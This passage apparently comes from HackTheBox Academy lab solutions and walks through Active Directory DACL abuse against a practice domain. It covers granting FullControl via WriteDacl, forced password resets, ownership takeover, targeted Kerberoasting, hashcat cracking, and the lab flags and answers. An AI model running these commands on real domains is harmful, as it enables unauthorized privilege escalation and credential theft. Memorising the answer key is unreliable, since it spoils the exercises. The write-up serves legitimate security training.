At last, when reading the contents of "flag.txt", students will attain the flag `GMSA_ACcounts_DACL_ABUSE`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/gMSADumper]
└──╼ [★]$ cat flag.txt

GMSA_ACcounts_DACL_ABUSE
```

Answer: `GMSA_ACcounts_DACL_ABUSE`

# Granting Rights and Ownership

## Question 1

### "Lilia has the WriteDacl access right over the Finance Managers group. Abuse this access right to gain access to the shared folder \\\\DC01\\Finance and submit the contents of flag.txt as the answer."

After spawning the target machine, students first need to clone the [ShutdownRepo impacket](https://github.com/ShutdownRepo/impacket) fork, create a Python virtual environment for it, and then install it:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
<SNIP>
```

Subsequently, since the question states that `Lilia` has `WriteDacl` over `Finance Managers`, students need to use `dacledit.py` to grant `lilia` `FullControl` over `Finance Managers`:

Code: shell

```shell
python3 examples/dacledit.py -principal lilia -target 'Finance Managers' -dc-ip STMIP inlanefreight.local/lilia:DACLPass123 -action write
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal lilia -target 'Finance Managers' -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123 -action write

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230614-123753.bak
[*] DACL modified successfully!
```

Afterward, students need to add `lilia` to the `Finance Managers` group using `net`:

Code: shell

```shell
net rpc group addmem 'Finance Managers' lilia -U inlanefreight.local/lilia%DACLPass123 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ net rpc group addmem 'Finance Managers' lilia -U inlanefreight.local/lilia%DACLPass123 -S STMIP
```

Utilizing the credentials `lilia:DACLPass123`, students need to use `smbclient` to download the file "flag.txt" from the `SMB` share at `//STMIP/Finance`:

Code: shell

```shell
smbclient //STMIP/Finance -U inlanefreight.local/lilia%DACLPass123 -c "get flag.txt"
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ smbclient //10.129.205.81/Finance -U inlanefreight.local/lilia%DACLPass123 -c "get flag.txt"

getting file \flag.txt of size 24 as flag.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
```

At last, when reading the contents of the file "flag.txt", students will attain the flag `WriteDACL_4Bus3_4_Gr0UpS`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ cat flag.txt

WriteDACL_4Bus3_4_Gr0UpS
```

Answer: `WriteDACL_4Bus3_4_Gr0UpS`

# Granting Rights and Ownership

## Question 2

### "Lilia has the WriteDacl access right over the account Kendra. Abuse this access right to gain access to the shared folder \\\\DC01\\Kendra and submit the contents of flag.txt as the answer."

Since the question states that `Lilia` has `WriteDacl` over `Kendra`, students need to use `dacledit.py` to grant `lilia` `ResetPassword` (or `FullControl`) over `Kendra`:

Code: shell

```shell
python3 examples/dacledit.py -principal lilia -target 'Kendra' -dc-ip STMIP inlanefreight.local/lilia:DACLPass123 -action write -rights ResetPassword
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal lilia -target 'Kendra' -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123 -action write -rights ResetPassword

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230614-125601.bak
[*] DACL modified successfully!
```

Subsequently, students need to use `net` to reset the password of `Kendra`:

Code: shell

```shell
net rpc password kendra 588bcd1257f14d9291d6ea20 -U inlanefreight.local/lilia%DACLPass123 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ net rpc password kendra 588bcd1257f14d9291d6ea20 -U inlanefreight.local/lilia%DACLPass123 -S 10.129.205.81
```

Students need to use `smbclient` with the credentials `kendra:588bcd1257f14d9291d6ea20` to download the file "flag.txt" from the `SMB` share at `//STMIP/Kendra`:

Code: shell

```shell
smbclient //STMIP/Kendra -U inlanefreight.local/kendra%588bcd1257f14d9291d6ea20 -c "get flag.txt"
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ smbclient //10.129.205.81/Kendra -U inlanefreight.local/kendra%588bcd1257f14d9291d6ea20 -c "get flag.txt"

getting file \flag.txt of size 18 as flag.txt (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
```

At last, when reading the contents of the file "flag.txt", students will attain the flag `Wr1t3_D4CL_4_US3rs`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ cat flag.txt

Wr1t3_D4CL_4_US3rs
```

Answer: `Wr1t3_D4CL_4_US3rs`

# Granting Rights and Ownership

## Question 3

### "Lilia is owner of the Managers group; abuse her privileges to gain access to the shared folder \\\\DC01\\Managers and submit the contents of flag.txt as the answer."

Since `lilia` is the owner of `Managers`, she is granted `WriteDacl` (and `ReadControl`) implicitly over the group. Therefore, students need to use `dacledit.py` to grant `lilia` `FullControl` over `Managers`:

Code: shell

```shell
python3 examples/dacledit.py -principal lilia -target 'Managers' -dc-ip STMIP inlanefreight.local/lilia:DACLPass123 -action write
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal lilia -target 'Managers' -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123 -action write

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230614-130638.bak
[*] DACL modified successfully!
```

Subsequently, students need to add `lilia` to the `Managers` group using `net`:

Code: shell

```shell
net rpc group addmem Managers lilia -U inlanefreight.local/lilia%DACLPass123 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ net rpc group addmem Managers lilia -U inlanefreight.local/lilia%DACLPass123 -S 10.129.205.81
```

Students need to use `smbclient` with the credentials `lilia:DACLPass123` to download the file "flag.txt" from the `SMB` share at `//STMIP/Managers`:

Code: shell

```shell
smbclient //STMIP/Managers/ -c "get flag.txt" -U 'inlanefreight.local/lilia%DACLPass123'
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ smbclient //10.129.205.81/Managers/ -c "get flag.txt" -U 'inlanefreight.local/lilia%DACLPass123'

getting file \flag.txt of size 19 as flag.txt (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
```

At last, when reading the contents of the file "flag.txt", students will attain the flag `Abus1nG_OWNERS_000s`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ cat flag.txt

Abus1nG_OWNERS_000s
```

Answer: `Abus1nG_OWNERS_000s`

# Granting Rights and Ownership

## Question 4

### "Use the Managers group privileges to abuse the company's CEO's account chap, and gain access to the shared folder \\\\DC01\\CEO, without changing the CEO's password. Submit the contents of flag.txt as the answer."

Since `lilia` belongs to the `Managers` group, she inherits all of its permissions, therefore, students first need to utilize `dacledit.py` to enumerate the `ACEs` of `Managers` over `chap`. Students will find that `Managers` has `WriteOwner` over `chap`:

Code: shell

```shell
python3 examples/dacledit.py -principal managers -target chap -dc-ip STMIP inlanefreight.local/lilia:DACLPass123
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal managers -target chap -dc-ip 10.129.116.36  inlanefreight.local/lilia:DACLPass123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-6605)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteOwner (0x80000)
[*]     Trustee (SID)             : Managers (S-1-5-21-1267651629-1192007096-1618970724-6605)
```

Therefore, students need to change the `ownership` of the account `chap` to be that of `lilia`. First, students need to download [owneredit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py):

Code: shell

```shell
wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py
```

Subsequently, students need to assign the `ownership` of `chap` to `lilia` with `owneredit.py`:

Code: shell

```shell
python3 owneredit.py -action write -new-owner lilia -target chap -dc-ip STMIP inlanefreight.local/lilia:DACLPass123
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 owneredit.py -action write -new-owner lilia -target chap -dc-ip 10.129.116.36 inlanefreight.local/lilia:DACLPass123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-1267651629-1192007096-1618970724-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] OwnerSid modified successfully!
```

Now that `lilia` is the `owner` of `chap`, she is granted `WriteDacl` over him; therefore, students need to use `dacledit.py` to grant `lilia` `FullControl` over `chap`:

Code: shell

```shell
python3 examples/dacledit.py -principal lilia -target chap -dc-ip STMIP inlanefreight.local/lilia:DACLPass123 -action write
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal lilia -target chap -dc-ip 10.129.116.36 inlanefreight.local/lilia:DACLPass123 -action write

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230614-184600.bak
[*] DACL modified successfully!
```

Then, students need to perform a `targeted Kerberoasting` attack against `chap` to retrieve his password's hash. First, students need to clone [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) and install its requirements:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/targetedKerberoast -q && cd targetedKerberoast
python3 -m pip install -r requirements.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/targetedKerberoast -q && cd targetedKerberoast
python3 -m pip install -r requirements.txt

Requirement already satisfied: ldap3 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.8.1)
Requirement already satisfied: pyasn1 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (0.4.8)
Requirement already satisfied: impacket in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 3)) (0.10.1.dev1+20230316.112532.f0ac44bd)
<SNIP>
```

Before running `targetedKerberoast.py`, students need to sync the time of `Pwnbox`/`PMVPN` with that of the `DC` using `ntpdate` (if not already installed, students can install it with the command `sudo apt install ntpdate`):

Code: shell

```shell
sudo ntpdate STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/targetedKerberoast]
└──╼ [★]$ sudo ntpdate 10.129.116.36

14 Jun 18:41:03 ntpdate[7884]: step time server 10.129.116.36 offset +18000.158784 sec
```

Subsequently, students need perform a `targeted Kerberoasting` attack against `chap` utilizing the account `lilia`, saving the password's hash into a file with the `-o` option:

Code: shell

```shell
python3 targetedKerberoast.py --request-user chap -d inlanefreight.local -u lilia -p DACLPass123 --dc-ip STMIP -o chapsHash.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/targetedKerberoast]
└──╼ [★]$ python3 targetedKerberoast.py --request-user chap -d inlanefreight.local -u lilia -p DACLPass123 --dc-ip 10.129.116.36 -o chapsHash.txt

[*] Starting kerberoast attacks
[*] Attacking user (chap)
[+] Writing hash to file for (chap)
```

Students then need to crack the hash with `hashcat`, utilizing `hash-mode` `13100` (`Kerberos 5, etype 23, TGS-REP`). Students will find out that the plaintext password of `chap` is `123456789`:

Code: shell

```shell
hashcat -m 13100 -w 3 -O chapsHash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/targetedKerberoast]
└──╼ [★]$ hashcat -m 13100 -w 3 -O chapsHash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*chap$INLANEFREIGHT.LOCAL$inlanefreight.local/chap*$ec7b028d361a6d802510c680a440b67d$499ca878560d08e53ccdcefd3b8ad62eb3d12925af7e0957c0e1e813d8a49333a1b4c8d3d0646d35d1a8a5cbb34d3778b06348cdaa9bf38968e5e6cf95e41aae619868786fc06f4dde310a95351fd74c06b8d818d08695d1383990a35e22aa18cedcbe59aeea0fbadeb37e51eaf0e9369ab385bd4a0031fbe15bb1439b09bd42e7c8505d7988c3e4c7f823c6a4abfc137f82730744757fe476cf0ffb7c867977094b5a431d8ed7947928a9914d6ce89056e5df9fb262f9fa0c70099a1ed70a0789400a2e324368bf29953132bd5f8f01b492c5f2ff1133d375e670be39d1480f46ee2e27387b52578e4c35bc9d6d86ba1dba6b958169e54bbea3b5c1137379bb9db3e9432e87ffe0b7fa7c2383e7df5a827bf805aefc6e7b821e520e9d31b7a578266b062ed8afd9bdb591cbf972b003342513946b5205fef74bdac88c7907b7e1ba7373b26c8edcca39b185a93d999d406304be1f29ba9f8efb77b8b3f3be19ecf2c4b5356bf23140652ce0d7845816b556174c787100f676aa1a7e1f9a76d2273b16bcd566b4d6127af4c21698f6835a68dee3137b996e43d527963dcfe987b2ecbb9a2017161d27be891a522b42d9e894886c4e455723df167a703c31ff96047c047c11ccf7d5d09a85871a1c3d0484030a21249a48041fff09ddccd77bba90b37833156cb6d908b361e8fe6a0e85070c463f76ca47aeb57a0b8782176af03fd5c07b24ffec97492080e185c9c27bf6c09f2416a36d7bd83cbae63ad955f9ff45cbb3945676b62cca4f6ff2e5bc4b0f3fad9f6d027624a22d054e579094f6e461289861779a9e593239c70977d0db304f8da413a0a1d6764226a467402c0953e700367b5dc8e4c8a76fda40b9ce4320f09c1fdadaa412c85dad343894e5b009b59c8c405071ce778f82705f7d291260dca0cf433137f732518e7437363691445a3270808c97b36aa73b1edd2fbfa9d64492609f59b5b06aa9e6d77fd22821a5de5f1b797178d6b8a17ebbc85f493c1138811605ee10f88d632ca8469e7daf5601b5950ca3b9929137e4a96001f7e9aa691f5cd8ee493f063d545a428d526398a588d05d831840605592b9ebc3b80fda4219d385a0e9b1281cde54e70ff41ce4b4119e662a553d8dd11be4991274e417efa928b3a3aa3b126cec0570e2f89c22ebecc947d0bbfe07679197b66f7664ec2e1cdab12d0e9fe0637d58d52a3d9bddd0ecb82e29e986996e4b1cfe28f489c36592e87ef7fadf1e0044f09198e0f7a29223beaaf957b4e09207c6b5da706ab28a517e74026b8e54feb7cf663650139e7b3d7cadf6bc66495a7178e02e1404c5b0c8fed2730074ebe46c30e8c8afaa0b0af4d89ca5fb89e8a1395d62501a2901273d83da4bccdc64d1702a1036f6f38c5c8865cce66a3d5496ceac715782d421c7802c35b17fcad6a396130af9473734ad1060c6cd5099f343a25426c67bce53944b5ffb299443a5a48c07b8f68ffd2cb41c91a7e94cdd385b32a95e044f38ded2f1459e72312b399c749c610bee38b7fbb48691ffed3403:123456789

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*chap$INLANEFREIGHT.LOCAL$inlanefreight...ed3403
<SNIP>
```

Utilizing the credentials `chap:123456789`, students need to use `smbclient` to download the flag file "flag.txt" from the `SMB` share at `//STMIP/CEO`:

Code: shell

```shell
smbclient //STMIP/CEO -U inlanefreight.local/chap%123456789 -c "get flag.txt"
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/targetedKerberoast]
└──╼ [★]$ smbclient //10.129.116.36/CEO -U inlanefreight.local/chap%123456789 -c "get flag.txt"

getting file \flag.txt of size 29 as flag.txt (4.0 KiloBytes/sec) (average 4.0 KiloBytes/sec)
```

At last, when reading the contents of "flag.txt", students will attain the flag `Getting_Acc3ss_T0_Th3_CEO_Acc`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/targetedKerberoast]
└──╼ [★]$ cat flag.txt

Getting_Acc3ss_T0_Th3_CEO_Acc
```

Answer: `Getting_Acc3ss_T0_Th3_CEO_Acc`

# Skills Assessment

## Question 1

### "What's the username of the account that Carlos can perform a targeted Kerberoasting attack against?"

For the first three questions, tools from Linux will be utilized, however, students can also use Windows ones.

After spawning the target machine, students need to update `/etc/hosts` to add an entry for the DC as `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.84.5 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use a `BloodHound` ingestor to enumerate the objects within the `inlanefreight.local` domain. On Linux, students can use `bloodhound.py` (while for Windows, students can use `SharpHound.exe`).

To use `bloodhound.py`, students need to clone [BloodHound.py](https://github.com/fox-it/BloodHound.py.git), move directories into `BloodHound.py/`, and then install `bloodhound.py` with `pip`:

Code: shell

```shell
git clone https://github.com/fox-it/BloodHound.py.git && cd BloodHound.py/
pip install .
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/BloodHound.py]
└──╼ [★]$ git clone https://github.com/fox-it/BloodHound.py.git && cd BloodHound.py/
pip install .

Cloning into 'BloodHound.py'...
remote: Enumerating objects: 1295, done.
remote: Counting objects: 100% (394/394), done.
remote: Compressing objects: 100% (114/114), done.
<SNIP>
```

Afterward, students need to use it to enumerate the `inlanefreight.local` domain, utilizing the credentials `carlos:Pentesting01`:

Code: shell

```shell
python3 bloodhound.py -c All -u carlos -p Pentesting01 -d inlanefreight.local -dc inlanefreight.local --zip -ns STMIP --dns-tcp -k
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/BloodHound.py]
└──╼ [★]$ python3 bloodhound.py -c All -u carlos -p Pentesting01 -d inlanefreight.local -dc inlanefreight.local --zip -ns 10.129.84.5 --dns-tcp -k

INFO: Found AD domain: inlanefreight.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: inlanefreight.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: inlanefreight.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 12 users
INFO: Found 60 groups
INFO: Found 4 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: remote_svc.inlanefreight.local
INFO: Querying computer: WS01.inlanefreight.local
INFO: Querying computer: DC01.inlanefreight.local
INFO: Skipping enumeration for remote_svc.inlanefreight.local since it could not be resolved.
WARNING: Failed to get service ticket for DC01.inlanefreight.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (dc01.inlanefreight.local:88)] [Errno -2] Name or service not known
INFO: Done in 00M 01S
INFO: Compressing output into 20230615142057_bloodhound.zip
```

Before running `BloodHound`, students need to start `neo4j console`:

Code: shell

```shell
sudo neo4j console
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ sudo neo4j console

Directories in use:
home:         /var/lib/neo4j
config:       /etc/neo4j
logs:         /var/log/neo4j
plugins:      /var/lib/neo4j/plugins
import:       /var/lib/neo4j/import
data:         /var/lib/neo4j/data
certificates: /var/lib/neo4j/certificates
licenses:     /var/lib/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2023-06-15 13:26:20.739+0000 INFO  Starting...
<SNIP>
```

Subsequently, students can run `bloodhound` and log in with the credentials `neo4j:neo4j`:

Code: shell

```shell
bloodhound
```

```
┌─[eu-academy-1]─[10.10.15.218]─[htb-ac-413848@htb-kuishccovl]─[~/BloodHound.py]
└──╼ [★]$ bloodhound

<SNIP>
```

![[HTB Solutions/CAPE/z. images/a0b8cfb4c49b832aa734b307086c1c99_MD5.jpg]]

Students need to upload the ZIP file created by `bloodhound.py`:

![[HTB Solutions/CAPE/z. images/e8bc74c4b2fb61f0f6fb02e9d2d3d1ba_MD5.jpg]]

At last, to identify accounts that `Carlos` can target for `Kerberoasting`, students need to write a Cypher query to find any relationship between `Carlos` and other accounts having the `access rights`/`privileges` `GenericAll`, `GenericWrite`, `WriteProperty`, or `ValidatedSPN`. Students will discover that `Carlos` can execute a `targeted Kerberoasting` attack against `Mathew`:

Code: cypher

```cypher
MATCH p=((n:User {name:"CARLOS@INLANEFREIGHT.LOCAL"})-[r:GenericAll|GenericWrite|WriteProperty|ValidatedSPN]->(m)) RETURN p
```

![[HTB Solutions/CAPE/z. images/462418e8a774d53e53e97ce0357c8670_MD5.jpg]]

Alternatively, students can also use `dacledit.py` to enumerate the `ACEs` `Carlos` has over `Mathew`. First, students need to clone the [ShutdownRepo impacket](https://github.com/ShutdownRepo/impacket) fork, create a Python virtual environment for it, and then install it:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
<SNIP>
```

When enumerating the `ACEs` that `Carlos` has over `Mathew`, students will discover that the `access mask` includes `WriteProperties`. Since the `ObjectType` member does not contain a `GUID`, `Carlos` can write to all of `Mathew`'s properties, including the `Service Principal Name`:

Code: shell

```shell
python3 examples/dacledit.py -principal carlos -target mathew -dc-ip STMIP inlanefreight.local/carlos:Pentesting01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal carlos -target mathew -dc-ip 10.129.205.122 inlanefreight.local/carlos:Pentesting01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-69916981-3983157826-2554592156-1112)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteProperties (0x20)
[*]     Trustee (SID)             : carlos (S-1-5-21-69916981-3983157826-2554592156-1112)
```

Answer: `Mathew`

# Skills Assessment

## Question 2

### "What's the password of the account that Carlos can perform a targeted Kerberoasting attack against?"

From the previous question, students are aware that `Carlos` has `GenericWrite` access over `Mathew`. Consequently, using `Carlos`' account, they must execute a `targeted Kerberoasting` attack against `Mathew` to retrieve his password hash. First, students need to clone [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) and install its requirements:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast/
python3 -m pip install -r requirements.txt
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast/
python3 -m pip install -r requirements.txt

Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (38/38), done.
<SNIP>
```

Before running it, students should synchronize the time of `Pwnbox`/`PMVPN` with that of the `DC` using `ntpdate`. If not already installed, students can install it with the command `sudo apt install ntpdate`:

Code: shell

```shell
sudo ntpdate STMIP
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/targetedKerberoast]
└──╼ [★]$ sudo ntpdate 10.129.205.122

15 Jun 15:08:39 ntpdate[5071]: step time server 10.129.205.122 offset +0.650556 sec
```

Subsequently, to obtain the password hash of `Mathew`, students need to perform a `targeted Kerberoasting` attack against `Mathew` using the account `Carlos` and save the hash into a file using the `-o` option:

Code: shell

```shell
python3 targetedKerberoast.py --request-user mathew -d inlanefreight.local -u carlos -p Pentesting01 --dc-ip STMIP -o mathewsHash.txt
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/targetedKerberoast]
└──╼ [★]$ python3 targetedKerberoast.py --request-user mathew -d inlanefreight.local -u carlos -p Pentesting01 --dc-ip 10.129.205.122 -o mathewsHash.txt

[*] Starting kerberoast attacks
[*] Attacking user (mathew)
[+] Writing hash to file for (mathew)
```

At last, students need to crack the password hash of `Mathew` using `hashcat` with `hash-mode` `13100` (`Kerberos 5, etype 23, TGS-REP`). They will discover that the plaintext of `Mathew`'s password hash is `ilovejesus`:

Code: shell

```shell
hashcat -m 13100 -w 3 -O mathewsHash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[eu-academy-1]─[10.10.14.217]─[htb-ac-413848@htb-gykj8odpqt]─[~/targetedKerberoast]
└──╼ [★]$ hashcat -m 13100 -w 3 -O mathewsHash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mathew$INLANEFREIGHT.LOCAL$inlanefreight.local/mathew*$b3b4592ff87824f796b1227757588fb3$63cebcdd86ea8b0c0843dc8f9df7da765979969358067ed88d38ed09d90dc9274c2008ac2b60f1638854a9950e8298390e222427c4aef93b557052d83da6a2b63b7350006fee29db6f962e92706c5543b27cec623fa1e196aee28620d859248613df2b2814b459bddd4d8cf1a5dbff4bac661bfb66001265062638d0f1d4f425315413f47fd6c5a24d7f86c2ebbacd7bf5eb06ae24397d2fbd1b7e0fe2d248998d54d75fd0e81c40972df49f3866b382107224aada3902804b83379e946ef422bb10003bebfe78aceb418b75c52d7c1578be97ff538051c90ef5c1b111b661db36a09f61420c0c8e12eaafb798b62144a1604ad882581aad24161733722d74a7c147553f2ca42d36b173e46a50537fcfb88e3f87b63df04ccd9440b46ecbc33098fe53f663ac1f20b23fd4b97c8e9b547c69482284387d656ae1f75e5ee5b03b6bf51b49275b3e5fd7424b71c19fadaf9653f9667db404593c23a65fea0c3b1cdd21e7985a39acf9b4fd2bc0919d9794a4d0a9010dcb8511ab29561f4c729ed30b07f6a38df8698a7d2e53a0aad0c715b80ea52b4569e38f7eb28b4c33eef9fac1642a018730255fac3fe7e1066a5947a3b418ffce85893f6dc436a407dfb3872bebc3cd2582bd0e377b74010b0978ce83c73409761ec246fb6bb7e90e97a67b6f0d045fa348f2c8ec0f403cac4507c08946f9ec1d43f7b534553920347a203248b4a5f9e35fc7ca0da46fc13942c16beac21d26c8bcc46698491f633faadadff4889be4d4bbcf1b9b98565adb30a1c6dacccec607c99778bee4ff6ce67cff7c614843b7ed88c7322642703bdca0d988019ea6992d4a1bc263cd8e60d363f9d04e7385c5db5ccb5e41cd9c941b4a76288744b251c8a9cfee445fa95021d562f6f6e189b7bfde623cb2a9c36fe6523a5ec5185ef9442bedfcd439062fcc537dbf297cb7c59fc5ed6d41f7ee07044594ad39716ddb5ac8f02dde5812e62efa8fa9dcfe72ce68ec3c21786ea9de41ad4d61bae92f373c4d6643ddbcffe3b7573938ba50b11e15991d468d6674dab5f89b88f8e526ed179d5c1c321e1ac763fb8bf2f7c2241d3f273cbeab4bfe6b0ceec96c8b1e0e608b41b0288ea92eb0b27c2c843b62dfc5aeba0073f1a1ed0e94d264564c19d3ee1acaca8ce218c629766cbec19ec80e5c624a9ed9c2d593f1c